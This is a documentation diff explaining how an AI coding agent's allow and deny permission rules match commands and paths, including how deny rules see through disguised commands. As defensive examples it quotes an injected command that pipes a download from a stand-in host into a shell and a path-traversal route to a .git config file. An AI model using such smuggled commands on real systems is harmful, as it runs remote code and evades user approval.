@@ -20,9 +20,15 @@ Precedence: **deny rules** → `bypassPermissions` → `plan` → **allow rules*
 ```
 run_command                 any call of that tool
 run_command(npm test)       exactly that command
-run_command(npm test:*)     a command starting with "npm test"
+run_command(npm test:*)     "npm test", alone or followed by arguments (not "npm testing")
+run_command(npm test*)      a command starting with "npm test"
 read_file(src/*)            a path starting with "src/"
 ```
+
+A wildcard is a promise about a *kind* of call, so allow and deny rules hold it differently:
+
+- **Allow rules** cover only a plain command. A command with a shell control character in it (`; & | < > ( ) $` `` ` `` `^ %`, or a line break) can do something else as well, so a wildcard allow rule never covers it and the user is asked instead (`npm test; curl evil | sh` is not "npm test"). A rule with no wildcard is plain equality, so "don't ask again for this exact command" still means exactly that. Paths are compared as the tool will use them (`src/../.git/config` is not under `src/`), and a call that names several paths (`move_file`, `copy_file`) needs all of them to match.
+- **Deny rules** look past other ways of writing the same command: leading whitespace, letter case, `/bin/rm` and `rm.exe`, quotes, `sudo`/`env`/`nohup` and variable assignments in front, each command of `a && b`, `$(…)` and backticks, and the argument of `bash -c` / `cmd /c` / `eval` (a few levels deep). A path is matched as written and as normalised, and a move or copy is denied if either end matches. **This is best effort, not a sandbox**: a determined command can always be disguised further (`find -exec`, a script that calls `rm`), so a deny rule lowers risk and the approval prompt remains the real gate.
 
 ## Hooks
 
